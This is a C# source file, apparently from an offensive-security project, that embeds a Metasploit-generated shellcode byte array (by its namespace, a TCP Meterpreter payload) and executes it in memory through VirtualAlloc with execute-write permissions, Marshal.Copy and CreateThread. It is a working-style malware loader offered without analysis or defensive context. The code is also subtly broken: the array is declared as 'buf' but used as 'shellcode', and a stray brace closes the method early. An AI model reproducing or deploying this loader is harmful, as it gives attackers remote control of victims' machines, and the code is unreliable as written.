using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.Diagnostics.Metrics;

namespace TCPMeterpreterProcess
{
    class Program
    {
        static void Main(string[] args)
        {
            // native function's compiled code
            // generated with metasploit
            byte[] buf = new byte[865] {0xbd,0x26,0x15,0x9a,0xfd,0xdb,
            0xc4,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0xd2,0x83,0xc2,
            0x04,0x31,0x6a,0x10,0x03,0x6a,0x10,0xc4,0xe0,0x20,0x8d,0xe5,
            0x17,0x3c,0xb3,0x37,0xfe,0xca,0x6f,0x43,0x5e,0x1a,0xb9,0x1a,
            0xaa,0xdf,0xfe,0x58,0x1c,0xb7,0x11,0x63,0x09,0x26,0xf0,0xe6,
            0xe6,0x4d,0x72,0x55,0x0b,0xa3,0xf4,0x41,0x24,0x0d,0xd2,0xc4,
            0xcf,0x8e,0x76,0x62,0xe2,0xfd,0xb1,0xbf,0xa0,0x9c,0x59,0x5c,
            0x10,0xe0,0x92,0xd7,0x05,0x1d,0x96,0x5c,0xf5,0x4c,0x4d,0x87,
            0xb0,0x1a,0xcd,0x39,0x15,0xc3,0xe6,0x11,0xad,0x5d,0x15,0x41,
            0x65,0xd5,0x7d,0xf0,0xa3,0xf2,0x1c,0x17,0xa1,0xda,0x1d,0xbf,
            0xfd,0xb1,0xd9,0xeb,0x67,0xff,0x0b,0xfd,0xf9,0x28,0x98,0x19,
            0xb3,0x97,0xa5,0xa2,0x4d,0xaa,0xb6,0x81,0x2e,0x2c,0x37,0x0d,
            0x72,0x69,0xf5,0x17,0x81,0xf3,0x92,0x02,0xca,0x62,0x39,0x12,
            0x83,0x23,0x1e,0x5c,0x72,0x39,0x4b,0x6b,0xba,0x5f,0xe8,0x7f,
            0xe6,0xdb,0xb3,0xd9,0xa6,0xe6,0x9f,0xc6,0x7d,0xef,0x49,0xc2,
            0x40,0x97,0xf2,0x45,0xee,0xf1,0xb4,0x85,0x4f,0x20,0x6a,0xd4,
            0x69,0x5b,0x96,0x93,0x71,0x0c,0x8f,0x0a,0x68,0x72,0x01,0xe2,
            0x39,0xa9,0x46,0x30,0xb5,0x0d,0xca,0x5c,0x1a,0xe5,0x0a,0x7b,
            0x90,0xe5,0xaf,0x2b,0x91,0x5d,0x1e,0xc0,0xe8,0x1e,0x43,0x8b,
            0x3b,0x5e,0x02,0xcd,0x83,0x45,0x33,0x34,0x19,0x09,0xc9,0x47,
            0x61,0x27,0x9a,0xa1,0x96,0x7e,0xbf,0x95,0xcf,0x51,0x5d,0xfb,
            0x30,0xf0,0x46,0xda,0x86,0xfb,0x5c,0xcd,0xb1,0x20,0x63,0xc4,
            0x89,0xc7,0x75,0x5b,0x3e,0x5c,0xb3,0xf3,0xe0,0x92,0x8e,0xf2,
            0x83,0xac,0x97,0x43,0xe4,0xae,0x18,0x2b,0xd3,0x68,0x4a,0xbb,
            0xd6,0xbd,0x4e,0xe6,0x22,0x00,0xcb,0x14,0x95,0xfa,0xe3,0x27,
            0x22,0xf5,0x81,0x67,0xe1,0x22,0x3c,0xa1,0x8d,0xb8,0xd7,0x62,
            0x03,0x3b,0x5b,0x36,0xdd,0x15,0x23,0x23,0x49,0x4c,0xf3,0xc5,
            0xe9,0x8a,0x9b,0x8e,0x83,0xa9,0xb4,0x74,0x32,0xcb,0xea,0x30,
            0x3b,0xf5,0x84,0x70,0x09,0x2a,0x0c,0x3d,0x0e,0x29,0xa2,0xa3,
            0x40,0x61,0x7a,0x40,0xe1,0xd4,0x7f,0x28,0x86,0x4c,0x8b,0xbb,
            0x21,0xe7,0x7c,0xe5,0xd5,0x52,0x84,0x93,0xa1,0xfd,0xa6,0x42,
            0xd1,0xf8,0x13,0x6c,0xf0,0x65,0x43,0x5d,0x0c,0xd4,0xa0,0x97,
            0x05,0x5f,0xe3,0x03,0xa6,0x66,0xeb,0x8b,0x0c,0x33,0xbd,0x6e,
            0x0e,0xc4,0xab,0x31,0x5c,0x08,0x47,0x1b,0x49,0xe2,0x94,0xc1,
            0x82,0x68,0xdf,0xd8,0x5d,0xbc,0xb7,0xe2,0x20,0x07,0x70,0x52,
            0x4c,0x14,0x0f,0xec,0xd1,0x57,0x3e,0xac,0x44,0x33,0x25,0xb6,
            0xf6,0x79,0xb9,0x79,0xd0,0x9c,0x10,0xc4,0xbf,0xd6,0x06,0x33,
            0xb3,0x4a,0x44,0xfd,0x9b,0xef,0xa1,0x23,0x8c,0xfe,0x8e,0x9e,
            0x96,0xb7,0xc3,0x27,0x79,0x31,0xb0,0xd5,0x01,0xc7,0xbe,0x82,
            0x5e,0x73,0xc2,0xf7,0x1a,0x08,0x7a,0x25,0x72,0x65,0xcb,0x43,
            0x08,0x85,0x1a,0x81,0x57,0x9e,0xab,0xb2,0x47,0x69,0xe8,0xd0,
            0xc8,0x33,0x99,0x19,0x7d,0x39,0x01,0xa6,0x02,0xf6,0x6d,0xf5,
            0x89,0xd3,0x2a,0x99,0x96,0xac,0xcf,0x27,0x72,0x02,0xc3,0x7a,
            0xea,0x35,0x43,0x91,0x45,0x9d,0xb1,0x59,0xfe,0x28,0xc5,0x6b,
            0x28,0xb6,0xbc,0x43,0x86,0xec,0x33,0x44,0x0f,0x91,0xdf,0x76,
            0x6b,0x4b,0xf0,0x97,0x4a,0x16,0xb2,0x81,0x0c,0xc0,0x46,0x69,
            0xe3,0x48,0x1c,0x38,0xbe,0x28,0x55,0x45,0x15,0x0c,0xee,0x28,
            0x56,0x4a,0x5a,0x9f,0x26,0xf3,0xfa,0xbd,0x17,0x0e,0xe7,0xa4,
            0xec,0xc2,0x4a,0x02,0x27,0xbe,0x14,0x8b,0x6a,0xee,0x6d,0x04,
            0x7c,0x3e,0xa3,0x7f,0xf5,0xbd,0xb7,0x42,0xbc,0xf9,0x31,0xdd,
            0xdd,0x58,0xbb,0xde,0x7d,0xce,0x34,0xa2,0x2f,0x5c,0xa5,0x9a,
            0x9f,0xd5,0xf1,0xe8,0x1d,0xac,0x0e,0xf1,0xc8,0xab,0xc0,0x8a,
            0x6e,0x1c,0x7c,0xcd,0x63,0x1c,0xd3,0x2e,0xcc,0x1d,0x0c,0xe9,
            0x19,0xa5,0xd,0xcb,0x8e,0x1d,0x98,0x0a,0x7c,0xf3,0xc8,0x7c,
            0x25,0xb9,0x6e,0x29,0x2a,0x7b,0x5e,0xdd,0xa0,0xa6,0x69,0xa9,
            0x6e,0x50,0x43,0x6e,0xfc,0xc1,0x5c,0x7f,0x71,0x2c,0xbe,0x98,
            0x96,0xa5,0x2d,0xfa,0x52,0x36,0x6b,0x7e,0x24,0x43,0xce,0x31,
            0x1d,0x73,0xf8,0x1f,0x95,0x55,0x35,0x35,0x13,0x96,0x60,0xf7,
            0x7c,0x44,0xce,0x61,0xcb,0x87,0x32,0xb9,0xab,0x08,0xca,0x6e,
            0xd7,0xba,0x80,0xd9,0xe7,0x69,0x97,0xe1,0xc9,0x94,0x59,0x3a,
            0x7f,0x60,0x20,0x7e,0x16,0xf9,0x4e,0x11,0xa5,0x37,0xc4,0xe3,
            0x67,0x37,0x8c,0xd2,0x57,0x83,0xb1,0x1a,0xff,0x51,0x86,0xca,
            0xe3,0x6e,0xc2,0xf3,0xab,0xf5,0x0d,0xab,0x19,0xdf,0xa3,0x38,
            0xdf,0x20,0xfd,0xe5,0x57,0x6e,0x98,0xd1,0x72,0x45,0x35,0xf8,
            0x52,0xce,0x64,0xe0,0xb3,0x0e,0x26,0x05,0xe3,0xba,0x39,0xb3,
            0x56,0x9c,0xbb,0x36,0x57,0xf3,0x04,0x0c,0x99,0x93,0x1b,0xe1,
            0x79,0x69,0x92,0x10,0xa3,0x4f,0xc3,0x7a,0x1f,0xb3,0xa2,0xe6,
            0x3d,0xf0,0x69,0xd6,0x5e,0xfd,0xb3,0xac,0x57,0xc0,0xe2,0xf2,
            0x80,0xfd,0x0b,0x09,0xc3,0x5a,0xe2,0xb5,0xf1,0xd3,0xec,0x80,
            0x12,0xd7,0x12,0xb2,0x5c,0x7f,0x45,0x1f,0x6c,0x20,0xd9,0x23,
            0x5e,0x86,0xf3,0x30,0x82,0xdd,0xea,0xfd,0x49,0xcf,0x6a,0x76,
            0xf4,0x0e,0x3e,0x87,0x6c,0x51,0x78,0xf3,0x1d,0xac,0x9a,0x07,
            0x86,0xf3,0xf6,0x53,0x35,0x8b,0xb6};

        };

            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            // prepare data
            IntPtr pinfo = IntPtr.Zero;
            // execute native code
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
        UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress,
        UInt32 dwSize, UInt32 dwFreeType);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
           UInt32 lpThreadAttributes,
           UInt32 dwStackSize,
           UInt32 lpStartAddress,
           IntPtr param,
           UInt32 dwCreationFlags,
           ref UInt32 lpThreadId
         );
        [DllImport("kernel32")]
        private static extern bool CloseHandle(IntPtr handle);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        [DllImport("kernel32")]
        private static extern IntPtr GetModuleHandle(string moduleName);
        [DllImport("kernel32")]
        private static extern UInt32 GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        private static extern UInt32 LoadLibrary(string lpFileName);
        [DllImport("kernel32")]
        private static extern UInt32 GetLastError();
    }
}